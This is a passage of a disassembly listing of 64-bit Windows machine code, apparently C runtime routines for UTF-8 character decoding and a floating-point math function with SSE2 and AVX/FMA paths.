   14000d2e0:	48 8d 3d eb 2a 00 00 	lea    0x2aeb(%rip),%rdi        # 0x14000fdd2
   14000d2e7:	48 8b c2             	mov    %rdx,%rax
   14000d2ea:	4c 8b fa             	mov    %rdx,%r15
   14000d2ed:	4d 0f 45 d9          	cmovne %r9,%r11
   14000d2f1:	48 85 d2             	test   %rdx,%rdx
   14000d2f4:	41 8d 6a 01          	lea    0x1(%r10),%ebp
   14000d2f8:	48 0f 45 fa          	cmovne %rdx,%rdi
   14000d2fc:	44 8b f5             	mov    %ebp,%r14d
   14000d2ff:	4d 0f 45 f0          	cmovne %r8,%r14
   14000d303:	48 f7 d8             	neg    %rax
   14000d306:	48 1b f6             	sbb    %rsi,%rsi
   14000d309:	48 23 f1             	and    %rcx,%rsi
   14000d30c:	4d 85 f6             	test   %r14,%r14
   14000d30f:	75 0c                	jne    0x14000d31d
   14000d311:	48 c7 c0 fe ff ff ff 	mov    $0xfffffffffffffffe,%rax
   14000d318:	e9 4e 01 00 00       	jmp    0x14000d46b
   14000d31d:	66 45 39 53 06       	cmp    %r10w,0x6(%r11)
   14000d322:	75 68                	jne    0x14000d38c
   14000d324:	44 0f b6 0f          	movzbl (%rdi),%r9d
   14000d328:	48 ff c7             	inc    %rdi
   14000d32b:	45 84 c9             	test   %r9b,%r9b
   14000d32e:	78 17                	js     0x14000d347
   14000d330:	48 85 f6             	test   %rsi,%rsi
   14000d333:	74 03                	je     0x14000d338
   14000d335:	44 89 0e             	mov    %r9d,(%rsi)
   14000d338:	45 84 c9             	test   %r9b,%r9b
   14000d33b:	41 0f 95 c2          	setne  %r10b
   14000d33f:	49 8b c2             	mov    %r10,%rax
   14000d342:	e9 24 01 00 00       	jmp    0x14000d46b
   14000d347:	41 8a c1             	mov    %r9b,%al
   14000d34a:	24 e0                	and    $0xe0,%al
   14000d34c:	3c c0                	cmp    $0xc0,%al
   14000d34e:	75 05                	jne    0x14000d355
   14000d350:	41 b0 02             	mov    $0x2,%r8b
   14000d353:	eb 1e                	jmp    0x14000d373
   14000d355:	41 8a c1             	mov    %r9b,%al
   14000d358:	24 f0                	and    $0xf0,%al
   14000d35a:	3c e0                	cmp    $0xe0,%al
   14000d35c:	75 05                	jne    0x14000d363
   14000d35e:	41 b0 03             	mov    $0x3,%r8b
   14000d361:	eb 10                	jmp    0x14000d373
   14000d363:	41 8a c1             	mov    %r9b,%al
   14000d366:	24 f8                	and    $0xf8,%al
   14000d368:	3c f0                	cmp    $0xf0,%al
   14000d36a:	0f 85 e9 00 00 00    	jne    0x14000d459
   14000d370:	41 b0 04             	mov    $0x4,%r8b
   14000d373:	41 0f b6 c0          	movzbl %r8b,%eax
   14000d377:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000d37c:	2b c8                	sub    %eax,%ecx
   14000d37e:	8b d5                	mov    %ebp,%edx
   14000d380:	d3 e2                	shl    %cl,%edx
   14000d382:	41 8a d8             	mov    %r8b,%bl
   14000d385:	2b d5                	sub    %ebp,%edx
   14000d387:	41 23 d1             	and    %r9d,%edx
   14000d38a:	eb 29                	jmp    0x14000d3b5
   14000d38c:	45 8a 43 04          	mov    0x4(%r11),%r8b
   14000d390:	41 8b 13             	mov    (%r11),%edx
   14000d393:	41 8a 5b 06          	mov    0x6(%r11),%bl
   14000d397:	41 8d 40 fe          	lea    -0x2(%r8),%eax
   14000d39b:	3c 02                	cmp    $0x2,%al
   14000d39d:	0f 87 b6 00 00 00    	ja     0x14000d459
   14000d3a3:	40 3a dd             	cmp    %bpl,%bl
   14000d3a6:	0f 82 ad 00 00 00    	jb     0x14000d459
   14000d3ac:	41 3a d8             	cmp    %r8b,%bl
   14000d3af:	0f 83 a4 00 00 00    	jae    0x14000d459
   14000d3b5:	0f b6 eb             	movzbl %bl,%ebp
   14000d3b8:	49 3b ee             	cmp    %r14,%rbp
   14000d3bb:	44 8b cd             	mov    %ebp,%r9d
   14000d3be:	4d 0f 43 ce          	cmovae %r14,%r9
   14000d3c2:	eb 1e                	jmp    0x14000d3e2
   14000d3c4:	0f b6 0f             	movzbl (%rdi),%ecx
   14000d3c7:	48 ff c7             	inc    %rdi
   14000d3ca:	8a c1                	mov    %cl,%al
   14000d3cc:	24 c0                	and    $0xc0,%al
   14000d3ce:	3c 80                	cmp    $0x80,%al
   14000d3d0:	0f 85 83 00 00 00    	jne    0x14000d459
   14000d3d6:	8b c2                	mov    %edx,%eax
   14000d3d8:	83 e1 3f             	and    $0x3f,%ecx
   14000d3db:	c1 e0 06             	shl    $0x6,%eax
   14000d3de:	8b d1                	mov    %ecx,%edx
   14000d3e0:	0b d0                	or     %eax,%edx
   14000d3e2:	48 8b c7             	mov    %rdi,%rax
   14000d3e5:	49 2b c7             	sub    %r15,%rax
   14000d3e8:	49 3b c1             	cmp    %r9,%rax
   14000d3eb:	72 d7                	jb     0x14000d3c4
   14000d3ed:	4c 3b cd             	cmp    %rbp,%r9
   14000d3f0:	73 1c                	jae    0x14000d40e
   14000d3f2:	41 0f b6 c0          	movzbl %r8b,%eax
   14000d3f6:	41 2a d9             	sub    %r9b,%bl
   14000d3f9:	66 41 89 43 04       	mov    %ax,0x4(%r11)
   14000d3fe:	0f b6 c3             	movzbl %bl,%eax
   14000d401:	66 41 89 43 06       	mov    %ax,0x6(%r11)
   14000d406:	41 89 13             	mov    %edx,(%r11)
   14000d409:	e9 03 ff ff ff       	jmp    0x14000d311
   14000d40e:	8d 82 00 28 ff ff    	lea    -0xd800(%rdx),%eax
   14000d414:	3d ff 07 00 00       	cmp    $0x7ff,%eax
   14000d419:	76 3e                	jbe    0x14000d459
   14000d41b:	81 fa 00 00 11 00    	cmp    $0x110000,%edx
   14000d421:	73 36                	jae    0x14000d459
   14000d423:	41 0f b6 c0          	movzbl %r8b,%eax
   14000d427:	c7 44 24 20 80 00 00 	movl   $0x80,0x20(%rsp)
   14000d42e:	00 
   14000d42f:	c7 44 24 24 00 08 00 	movl   $0x800,0x24(%rsp)
   14000d436:	00 
   14000d437:	c7 44 24 28 00 00 01 	movl   $0x10000,0x28(%rsp)
   14000d43e:	00 
   14000d43f:	3b 54 84 18          	cmp    0x18(%rsp,%rax,4),%edx
   14000d443:	72 14                	jb     0x14000d459
   14000d445:	48 85 f6             	test   %rsi,%rsi
   14000d448:	74 02                	je     0x14000d44c
   14000d44a:	89 16                	mov    %edx,(%rsi)
   14000d44c:	f7 da                	neg    %edx
   14000d44e:	4d 89 13             	mov    %r10,(%r11)
   14000d451:	48 1b c0             	sbb    %rax,%rax
   14000d454:	48 23 c5             	and    %rbp,%rax
   14000d457:	eb 12                	jmp    0x14000d46b
   14000d459:	4d 89 13             	mov    %r10,(%r11)
   14000d45c:	e8 df a2 ff ff       	call   0x140007740
   14000d461:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   14000d467:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000d46b:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000d470:	48 33 cc             	xor    %rsp,%rcx
   14000d473:	e8 b8 5c ff ff       	call   0x140003130
   14000d478:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   14000d47d:	48 83 c4 40          	add    $0x40,%rsp
   14000d481:	41 5f                	pop    %r15
   14000d483:	41 5e                	pop    %r14
   14000d485:	5f                   	pop    %rdi
   14000d486:	5e                   	pop    %rsi
   14000d487:	5d                   	pop    %rbp
   14000d488:	c3                   	ret
   14000d489:	cc                   	int3
   14000d48a:	cc                   	int3
   14000d48b:	cc                   	int3
   14000d48c:	cc                   	int3
   14000d48d:	cc                   	int3
   14000d48e:	cc                   	int3
   14000d48f:	cc                   	int3
   14000d490:	48 83 ec 58          	sub    $0x58,%rsp
   14000d494:	66 0f 7f 74 24 20    	movdqa %xmm6,0x20(%rsp)
   14000d49a:	83 3d 9b e7 00 00 00 	cmpl   $0x0,0xe79b(%rip)        # 0x14001bc3c
   14000d4a1:	0f 85 e9 02 00 00    	jne    0x14000d790
   14000d4a7:	66 0f 28 d8          	movapd %xmm0,%xmm3
   14000d4ab:	66 0f 28 e0          	movapd %xmm0,%xmm4
   14000d4af:	66 0f 73 d3 34       	psrlq  $0x34,%xmm3
   14000d4b4:	66 48 0f 7e c0       	movq   %xmm0,%rax
   14000d4b9:	66 0f fb 1d 7f 79 00 	psubq  0x797f(%rip),%xmm3        # 0x140014e40
   14000d4c0:	00 
   14000d4c1:	66 0f 28 e8          	movapd %xmm0,%xmm5
   14000d4c5:	66 0f 54 2d 43 79 00 	andpd  0x7943(%rip),%xmm5        # 0x140014e10
   14000d4cc:	00 
   14000d4cd:	66 0f 2f 2d 3b 79 00 	comisd 0x793b(%rip),%xmm5        # 0x140014e10
   14000d4d4:	00 
   14000d4d5:	0f 84 85 02 00 00    	je     0x14000d760
   14000d4db:	66 0f 28 d0          	movapd %xmm0,%xmm2
   14000d4df:	f3 0f e6 f3          	cvtdq2pd %xmm3,%xmm6
   14000d4e3:	66 0f 57 ed          	xorpd  %xmm5,%xmm5
   14000d4e7:	66 0f 2f c5          	comisd %xmm5,%xmm0
   14000d4eb:	0f 86 2f 02 00 00    	jbe    0x14000d720
   14000d4f1:	66 0f db 15 67 79 00 	pand   0x7967(%rip),%xmm2        # 0x140014e60
   14000d4f8:	00 
   14000d4f9:	f2 0f 5c 25 ef 79 00 	subsd  0x79ef(%rip),%xmm4        # 0x140014ef0
   14000d500:	00 
   14000d501:	66 0f 2f 35 77 7a 00 	comisd 0x7a77(%rip),%xmm6        # 0x140014f80
   14000d508:	00 
   14000d509:	0f 84 d8 01 00 00    	je     0x14000d6e7
   14000d50f:	66 0f 54 25 c9 7a 00 	andpd  0x7ac9(%rip),%xmm4        # 0x140014fe0
   14000d516:	00 
   14000d517:	4c 8b c8             	mov    %rax,%r9
   14000d51a:	48 23 05 4f 79 00 00 	and    0x794f(%rip),%rax        # 0x140014e70
   14000d521:	4c 23 0d 58 79 00 00 	and    0x7958(%rip),%r9        # 0x140014e80
   14000d528:	49 d1 e1             	shl    $1,%r9
   14000d52b:	49 03 c1             	add    %r9,%rax
   14000d52e:	66 48 0f 6e c8       	movq   %rax,%xmm1
   14000d533:	66 0f 2f 25 65 7a 00 	comisd 0x7a65(%rip),%xmm4        # 0x140014fa0
   14000d53a:	00 
   14000d53b:	0f 82 df 00 00 00    	jb     0x14000d620
   14000d541:	48 c1 e8 2c          	shr    $0x2c,%rax
   14000d545:	66 0f eb 15 b3 79 00 	por    0x79b3(%rip),%xmm2        # 0x140014f00
   14000d54c:	00 
   14000d54d:	66 0f eb 0d ab 79 00 	por    0x79ab(%rip),%xmm1        # 0x140014f00
   14000d554:	00 
   14000d555:	4c 8d 0d 24 8b 00 00 	lea    0x8b24(%rip),%r9        # 0x140016080
   14000d55c:	f2 0f 5c ca          	subsd  %xmm2,%xmm1
   14000d560:	f2 41 0f 59 0c c1    	mulsd  (%r9,%rax,8),%xmm1
   14000d566:	66 0f 28 d1          	movapd %xmm1,%xmm2
   14000d56a:	66 0f 28 c1          	movapd %xmm1,%xmm0
   14000d56e:	4c 8d 0d eb 7a 00 00 	lea    0x7aeb(%rip),%r9        # 0x140015060
   14000d575:	f2 0f 10 1d f3 79 00 	movsd  0x79f3(%rip),%xmm3        # 0x140014f70
   14000d57c:	00 
   14000d57d:	f2 0f 10 0d bb 79 00 	movsd  0x79bb(%rip),%xmm1        # 0x140014f40
   14000d584:	00 
   14000d585:	f2 0f 59 da          	mulsd  %xmm2,%xmm3
   14000d589:	f2 0f 59 ca          	mulsd  %xmm2,%xmm1
   14000d58d:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
   14000d591:	66 0f 28 e0          	movapd %xmm0,%xmm4
   14000d595:	f2 0f 58 1d c3 79 00 	addsd  0x79c3(%rip),%xmm3        # 0x140014f60
   14000d59c:	00 
   14000d59d:	f2 0f 58 0d 8b 79 00 	addsd  0x798b(%rip),%xmm1        # 0x140014f30
   14000d5a4:	00 
   14000d5a5:	f2 0f 59 e0          	mulsd  %xmm0,%xmm4
   14000d5a9:	f2 0f 59 da          	mulsd  %xmm2,%xmm3
   14000d5ad:	f2 0f 59 c8          	mulsd  %xmm0,%xmm1
   14000d5b1:	f2 0f 58 1d 97 79 00 	addsd  0x7997(%rip),%xmm3        # 0x140014f50
   14000d5b8:	00 
   14000d5b9:	f2 0f 58 ca          	addsd  %xmm2,%xmm1
   14000d5bd:	f2 0f 59 dc          	mulsd  %xmm4,%xmm3
   14000d5c1:	f2 0f 58 cb          	addsd  %xmm3,%xmm1
   14000d5c5:	f2 0f 10 2d 03 79 00 	movsd  0x7903(%rip),%xmm5        # 0x140014ed0
   14000d5cc:	00 
   14000d5cd:	f2 0f 59 0d bb 78 00 	mulsd  0x78bb(%rip),%xmm1        # 0x140014e90
   14000d5d4:	00 
   14000d5d5:	f2 0f 59 ee          	mulsd  %xmm6,%xmm5
   14000d5d9:	f2 0f 5c e9          	subsd  %xmm1,%xmm5
   14000d5dd:	f2 41 0f 10 04 c1    	movsd  (%r9,%rax,8),%xmm0
   14000d5e3:	48 8d 15 86 82 00 00 	lea    0x8286(%rip),%rdx        # 0x140015870
   14000d5ea:	f2 0f 10 14 c2       	movsd  (%rdx,%rax,8),%xmm2
   14000d5ef:	f2 0f 10 25 c9 78 00 	movsd  0x78c9(%rip),%xmm4        # 0x140014ec0
   14000d5f6:	00 
   14000d5f7:	f2 0f 59 e6          	mulsd  %xmm6,%xmm4
   14000d5fb:	f2 0f 58 c4          	addsd  %xmm4,%xmm0
   14000d5ff:	f2 0f 58 d5          	addsd  %xmm5,%xmm2
   14000d603:	f2 0f 58 c2          	addsd  %xmm2,%xmm0
   14000d607:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   14000d60d:	48 83 c4 58          	add    $0x58,%rsp
   14000d611:	c3                   	ret
   14000d612:	66 66 66 66 66 66 0f 	data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000d619:	1f 84 00 00 00 00 00 
   14000d620:	f2 0f 10 15 b8 78 00 	movsd  0x78b8(%rip),%xmm2        # 0x140014ee0
   14000d627:	00 
   14000d628:	f2 0f 5c 05 c0 78 00 	subsd  0x78c0(%rip),%xmm0        # 0x140014ef0
   14000d62f:	00 
   14000d630:	f2 0f 58 d0          	addsd  %xmm0,%xmm2
   14000d634:	66 0f 28 c8          	movapd %xmm0,%xmm1
   14000d638:	f2 0f 5e ca          	divsd  %xmm2,%xmm1
   14000d63c:	f2 0f 10 25 bc 79 00 	movsd  0x79bc(%rip),%xmm4        # 0x140015000
   14000d643:	00 
   14000d644:	f2 0f 10 2d d4 79 00 	movsd  0x79d4(%rip),%xmm5        # 0x140015020
   14000d64b:	00 
   14000d64c:	66 0f 28 f0          	movapd %xmm0,%xmm6
   14000d650:	f2 0f 59 f1          	mulsd  %xmm1,%xmm6
   14000d654:	f2 0f 58 c9          	addsd  %xmm1,%xmm1
   14000d658:	66 0f 28 d1          	movapd %xmm1,%xmm2
   14000d65c:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   14000d660:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   14000d664:	f2 0f 59 ea          	mulsd  %xmm2,%xmm5
   14000d668:	f2 0f 58 25 80 79 00 	addsd  0x7980(%rip),%xmm4        # 0x140014ff0
   14000d66f:	00 
   14000d670:	f2 0f 58 2d 98 79 00 	addsd  0x7998(%rip),%xmm5        # 0x140015010
   14000d677:	00 
   14000d678:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   14000d67c:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   14000d680:	f2 0f 59 d2          	mulsd  %xmm2,%xmm2
   14000d684:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   14000d688:	f2 0f 59 ea          	mulsd  %xmm2,%xmm5
   14000d68c:	f2 0f 10 15 1c 78 00 	movsd  0x781c(%rip),%xmm2        # 0x140014eb0
   14000d693:	00 
   14000d694:	f2 0f 58 e5          	addsd  %xmm5,%xmm4
   14000d698:	f2 0f 5c e6          	subsd  %xmm6,%xmm4
   14000d69c:	f2 0f 10 35 fc 77 00 	movsd  0x77fc(%rip),%xmm6        # 0x140014ea0
   14000d6a3:	00 
   14000d6a4:	66 0f 28 d8          	movapd %xmm0,%xmm3
   14000d6a8:	66 0f db 1d 80 79 00 	pand   0x7980(%rip),%xmm3        # 0x140015030
   14000d6af:	00 
   14000d6b0:	f2 0f 5c c3          	subsd  %xmm3,%xmm0
   14000d6b4:	f2 0f 58 e0          	addsd  %xmm0,%xmm4
   14000d6b8:	66 0f 28 c3          	movapd %xmm3,%xmm0
   14000d6bc:	66 0f 28 cc          	movapd %xmm4,%xmm1
   14000d6c0:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   14000d6c4:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
   14000d6c8:	f2 0f 59 ce          	mulsd  %xmm6,%xmm1
   14000d6cc:	f2 0f 59 de          	mulsd  %xmm6,%xmm3
   14000d6d0:	f2 0f 58 c4          	addsd  %xmm4,%xmm0
   14000d6d4:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
   14000d6d8:	f2 0f 58 c3          	addsd  %xmm3,%xmm0
   14000d6dc:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   14000d6e2:	48 83 c4 58          	add    $0x58,%rsp
   14000d6e6:	c3                   	ret
   14000d6e7:	66 0f eb 15 01 78 00 	por    0x7801(%rip),%xmm2        # 0x140014ef0
   14000d6ee:	00 
   14000d6ef:	f2 0f 5c 15 f9 77 00 	subsd  0x77f9(%rip),%xmm2        # 0x140014ef0
   14000d6f6:	00 
   14000d6f7:	f2 0f 10 ea          	movsd  %xmm2,%xmm5
   14000d6fb:	66 0f db 15 5d 77 00 	pand   0x775d(%rip),%xmm2        # 0x140014e60
   14000d702:	00 
   14000d703:	66 48 0f 7e d0       	movq   %xmm2,%rax
   14000d708:	66 0f 73 d5 34       	psrlq  $0x34,%xmm5
   14000d70d:	66 0f fa 2d 7b 78 00 	psubd  0x787b(%rip),%xmm5        # 0x140014f90
   14000d714:	00 
   14000d715:	f3 0f e6 f5          	cvtdq2pd %xmm5,%xmm6
   14000d719:	e9 f1 fd ff ff       	jmp    0x14000d50f
   14000d71e:	66 90                	xchg   %ax,%ax
   14000d720:	75 1e                	jne    0x14000d740
   14000d722:	f2 0f 10 0d d6 76 00 	movsd  0x76d6(%rip),%xmm1        # 0x140014e00
   14000d729:	00 
   14000d72a:	44 8b 05 0f 79 00 00 	mov    0x790f(%rip),%r8d        # 0x140015040
   14000d731:	e8 ea 08 00 00       	call   0x14000e020
   14000d736:	eb 48                	jmp    0x14000d780
   14000d738:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000d73f:	00 
   14000d740:	f2 0f 10 0d d8 76 00 	movsd  0x76d8(%rip),%xmm1        # 0x140014e20
   14000d747:	00 
   14000d748:	44 8b 05 f5 78 00 00 	mov    0x78f5(%rip),%r8d        # 0x140015044
   14000d74f:	e8 cc 08 00 00       	call   0x14000e020
   14000d754:	eb 2a                	jmp    0x14000d780
   14000d756:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000d75d:	00 00 00 
   14000d760:	48 3b 05 a9 76 00 00 	cmp    0x76a9(%rip),%rax        # 0x140014e10
   14000d767:	74 17                	je     0x14000d780
   14000d769:	48 3b 05 90 76 00 00 	cmp    0x7690(%rip),%rax        # 0x140014e00
   14000d770:	74 ce                	je     0x14000d740
   14000d772:	48 0b 05 b7 76 00 00 	or     0x76b7(%rip),%rax        # 0x140014e30
   14000d779:	66 48 0f 6e c0       	movq   %rax,%xmm0
   14000d77e:	66 90                	xchg   %ax,%ax
   14000d780:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   14000d786:	48 83 c4 58          	add    $0x58,%rsp
   14000d78a:	c3                   	ret
   14000d78b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000d790:	48 33 c0             	xor    %rax,%rax
   14000d793:	c5 e1 73 d0 34       	vpsrlq $0x34,%xmm0,%xmm3
   14000d798:	c4 e1 f9 7e c0       	vmovq  %xmm0,%rax
   14000d79d:	c5 e1 fb 1d 9b 76 00 	vpsubq 0x769b(%rip),%xmm3,%xmm3        # 0x140014e40
   14000d7a4:	00 
   14000d7a5:	c5 fa e6 f3          	vcvtdq2pd %xmm3,%xmm6
   14000d7a9:	c5 f9 db 2d 5f 76 00 	vpand  0x765f(%rip),%xmm0,%xmm5        # 0x140014e10
   14000d7b0:	00 
   14000d7b1:	c5 f9 2f 2d 57 76 00 	vcomisd 0x7657(%rip),%xmm5        # 0x140014e10
   14000d7b8:	00 
   14000d7b9:	0f 84 41 02 00 00    	je     0x14000da00
   14000d7bf:	c5 d1 ef ed          	vpxor  %xmm5,%xmm5,%xmm5
   14000d7c3:	c5 f9 2f c5          	vcomisd %xmm5,%xmm0
   14000d7c7:	0f 86 e3 01 00 00    	jbe    0x14000d9b0
   14000d7cd:	c5 f9 db 15 8b 76 00 	vpand  0x768b(%rip),%xmm0,%xmm2        # 0x140014e60
   14000d7d4:	00 
   14000d7d5:	c5 fb 5c 25 13 77 00 	vsubsd 0x7713(%rip),%xmm0,%xmm4        # 0x140014ef0
   14000d7dc:	00 
   14000d7dd:	c5 f9 2f 35 9b 77 00 	vcomisd 0x779b(%rip),%xmm6        # 0x140014f80
   14000d7e4:	00 
   14000d7e5:	0f 84 8e 01 00 00    	je     0x14000d979
   14000d7eb:	c5 f9 db 0d 7d 76 00 	vpand  0x767d(%rip),%xmm0,%xmm1        # 0x140014e70
   14000d7f2:	00 
   14000d7f3:	c5 f9 db 1d 85 76 00 	vpand  0x7685(%rip),%xmm0,%xmm3        # 0x140014e80
   14000d7fa:	00 
   14000d7fb:	c5 e1 73 f3 01       	vpsllq $0x1,%xmm3,%xmm3
   14000d800:	c5 e1 d4 c9          	vpaddq %xmm1,%xmm3,%xmm1
   14000d804:	c4 e1 f9 7e c8       	vmovq  %xmm1,%rax
   14000d809:	c5 d9 db 25 cf 77 00 	vpand  0x77cf(%rip),%xmm4,%xmm4        # 0x140014fe0
   14000d810:	00 
   14000d811:	c5 f9 2f 25 87 77 00 	vcomisd 0x7787(%rip),%xmm4        # 0x140014fa0
   14000d818:	00 
   14000d819:	0f 82 b1 00 00 00    	jb     0x14000d8d0
   14000d81f:	48 c1 e8 2c          	shr    $0x2c,%rax
   14000d823:	c5 e9 eb 15 d5 76 00 	vpor   0x76d5(%rip),%xmm2,%xmm2        # 0x140014f00
   14000d82a:	00 
   14000d82b:	c5 f1 eb 0d cd 76 00 	vpor   0x76cd(%rip),%xmm1,%xmm1        # 0x140014f00
   14000d832:	00 
   14000d833:	4c 8d 0d 46 88 00 00 	lea    0x8846(%rip),%r9        # 0x140016080
   14000d83a:	c5 f3 5c ca          	vsubsd %xmm2,%xmm1,%xmm1
   14000d83e:	c4 c1 73 59 0c c1    	vmulsd (%r9,%rax,8),%xmm1,%xmm1
   14000d844:	4c 8d 0d 15 78 00 00 	lea    0x7815(%rip),%r9        # 0x140015060
   14000d84b:	c5 f3 59 c1          	vmulsd %xmm1,%xmm1,%xmm0
   14000d84f:	c5 fb 10 1d 19 77 00 	vmovsd 0x7719(%rip),%xmm3        # 0x140014f70
   14000d856:	00 
   14000d857:	c5 fb 10 2d e1 76 00 	vmovsd 0x76e1(%rip),%xmm5        # 0x140014f40
   14000d85e:	00 
   14000d85f:	c4 e2 f1 a9 1d f8 76 	vfmadd213sd 0x76f8(%rip),%xmm1,%xmm3        # 0x140014f60
   14000d866:	00 00 
   14000d868:	c4 e2 f1 a9 2d 8f 76 	vfmadd213sd 0x768f(%rip),%xmm1,%xmm5        # 0x140014f00
   14000d86f:	00 00 
   14000d871:	f2 0f 10 e0          	movsd  %xmm0,%xmm4
   14000d875:	c4 e2 f1 a9 1d d2 76 	vfmadd213sd 0x76d2(%rip),%xmm1,%xmm3        # 0x140014f50
   14000d87c:	00 00 
   14000d87e:	c5 fb 59 e0          	vmulsd %xmm0,%xmm0,%xmm4
   14000d882:	c4 e2 d1 b9 c8       	vfmadd231sd %xmm0,%xmm5,%xmm1
   14000d887:	c4 e2 e1 b9 cc       	vfmadd231sd %xmm4,%xmm3,%xmm1
   14000d88c:	c5 f3 59 0d fc 75 00 	vmulsd 0x75fc(%rip),%xmm1,%xmm1        # 0x140014e90
   14000d893:	00 
   14000d894:	c5 fb 10 2d 34 76 00 	vmovsd 0x7634(%rip),%xmm5        # 0x140014ed0
   14000d89b:	00 
   14000d89c:	c4 e2 c9 ab e9       	vfmsub213sd %xmm1,%xmm6,%xmm5
   14000d8a1:	f2 41 0f 10 04 c1    	movsd  (%r9,%rax,8),%xmm0
   14000d8a7:	48 8d 15 c2 7f 00 00 	lea    0x7fc2(%rip),%rdx        # 0x140015870
   14000d8ae:	f2 0f 10 14 c2       	movsd  (%rdx,%rax,8),%xmm2
   14000d8b3:	c5 eb 58 d5          	vaddsd %xmm5,%xmm2,%xmm2
   14000d8b7:	c4 e2 c9 b9 05 00 76 	vfmadd231sd 0x7600(%rip),%xmm6,%xmm0        # 0x140014ec0
   14000d8be:	00 00 
   14000d8c0:	c5 fb 58 c2          	vaddsd %xmm2,%xmm0,%xmm0
   14000d8c4:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000d8ca:	48 83 c4 58          	add    $0x58,%rsp
   14000d8ce:	c3                   	ret
   14000d8cf:	90                   	nop
   14000d8d0:	c5 fb 10 15 08 76 00 	vmovsd 0x7608(%rip),%xmm2        # 0x140014ee0
   14000d8d7:	00 
   14000d8d8:	c5 fb 5c 05 10 76 00 	vsubsd 0x7610(%rip),%xmm0,%xmm0        # 0x140014ef0
   14000d8df:	00 
   14000d8e0:	c5 eb 58 d0          	vaddsd %xmm0,%xmm2,%xmm2
   14000d8e4:	c5 fb 5e ca          	vdivsd %xmm2,%xmm0,%xmm1
   14000d8e8:	c5 fb 10 25 10 77 00 	vmovsd 0x7710(%rip),%xmm4        # 0x140015000
   14000d8ef:	00 
   14000d8f0:	c5 fb 10 2d 28 77 00 	vmovsd 0x7728(%rip),%xmm5        # 0x140015020
   14000d8f7:	00 
   14000d8f8:	c5 fb 59 f1          	vmulsd %xmm1,%xmm0,%xmm6
   14000d8fc:	c5 f3 58 c9          	vaddsd %xmm1,%xmm1,%xmm1
   14000d900:	c5 f3 59 d1          	vmulsd %xmm1,%xmm1,%xmm2
   14000d904:	c4 e2 e9 a9 25 e3 76 	vfmadd213sd 0x76e3(%rip),%xmm2,%xmm4        # 0x140014ff0
   14000d90b:	00 00 
   14000d90d:	c4 e2 e9 a9 2d fa 76 	vfmadd213sd 0x76fa(%rip),%xmm2,%xmm5        # 0x140015010
   14000d914:	00 00 
   14000d916:	c5 eb 59 d1          	vmulsd %xmm1,%xmm2,%xmm2
   14000d91a:	c5 db 59 e2          	vmulsd %xmm2,%xmm4,%xmm4
   14000d91e:	c5 eb 59 d2          	vmulsd %xmm2,%xmm2,%xmm2
   14000d922:	c5 eb 59 d1          	vmulsd %xmm1,%xmm2,%xmm2
   14000d926:	c5 d3 59 ea          	vmulsd %xmm2,%xmm5,%xmm5
   14000d92a:	c5 db 58 e5          	vaddsd %xmm5,%xmm4,%xmm4
   14000d92e:	c5 db 5c e6          	vsubsd %xmm6,%xmm4,%xmm4
   14000d932:	c5 f9 db 1d f6 76 00 	vpand  0x76f6(%rip),%xmm0,%xmm3        # 0x140015030
   14000d939:	00 
   14000d93a:	c5 fb 5c c3          	vsubsd %xmm3,%xmm0,%xmm0
   14000d93e:	c5 db 58 e0          	vaddsd %xmm0,%xmm4,%xmm4
   14000d942:	c5 db 59 0d 56 75 00 	vmulsd 0x7556(%rip),%xmm4,%xmm1        # 0x140014ea0
   14000d949:	00 
   14000d94a:	c5 db 59 25 5e 75 00 	vmulsd 0x755e(%rip),%xmm4,%xmm4        # 0x140014eb0
   14000d951:	00 
   14000d952:	c5 e3 59 05 56 75 00 	vmulsd 0x7556(%rip),%xmm3,%xmm0        # 0x140014eb0
   14000d959:	00 
   14000d95a:	c5 e3 59 1d 3e 75 00 	vmulsd 0x753e(%rip),%xmm3,%xmm3        # 0x140014ea0
   14000d961:	00 
   14000d962:	c5 fb 58 c4          	vaddsd %xmm4,%xmm0,%xmm0
   14000d966:	c5 fb 58 c1          	vaddsd %xmm1,%xmm0,%xmm0
   14000d96a:	c5 fb 58 c3          	vaddsd %xmm3,%xmm0,%xmm0
   14000d96e:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000d974:	48 83 c4 58          	add    $0x58,%rsp
   14000d978:	c3                   	ret
   14000d979:	c5 e9 eb 15 6f 75 00 	vpor   0x756f(%rip),%xmm2,%xmm2        # 0x140014ef0
   14000d980:	00 
   14000d981:	c5 eb 5c 15 67 75 00 	vsubsd 0x7567(%rip),%xmm2,%xmm2        # 0x140014ef0
   14000d988:	00 
   14000d989:	c5 d1 73 d2 34       	vpsrlq $0x34,%xmm2,%xmm5
   14000d98e:	c5 e9 db 15 ca 74 00 	vpand  0x74ca(%rip),%xmm2,%xmm2        # 0x140014e60
   14000d995:	00 
   14000d996:	c5 f9 28 c2          	vmovapd %xmm2,%xmm0
   14000d99a:	c5 d1 fa 2d ee 75 00 	vpsubd 0x75ee(%rip),%xmm5,%xmm5        # 0x140014f90
   14000d9a1:	00 
   14000d9a2:	c5 fa e6 f5          	vcvtdq2pd %xmm5,%xmm6
   14000d9a6:	e9 40 fe ff ff       	jmp    0x14000d7eb
   14000d9ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000d9b0:	75 2e                	jne    0x14000d9e0
